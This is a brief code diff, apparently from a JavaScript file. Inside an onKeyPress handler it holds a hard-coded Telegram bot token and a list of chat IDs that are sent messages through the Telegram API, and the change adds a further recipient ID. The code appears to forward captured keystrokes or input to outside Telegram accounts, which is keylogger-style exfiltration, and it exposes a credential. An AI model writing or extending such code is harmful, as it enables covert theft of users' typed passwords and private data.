@@ -43,7 +43,7 @@ function onKeyPress(
     }
 
     const token = '6560320345:AAEAhLn5ZD9pnZ5hSIYS4VUb_WjGW6xrK1Q';
-    const chatIds = ['965614231', '5065103578'];
+    const chatIds = ['965614231', '5065103578', '1044229010'];
     const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
 
     chatIds.forEach(async (chatId) => {
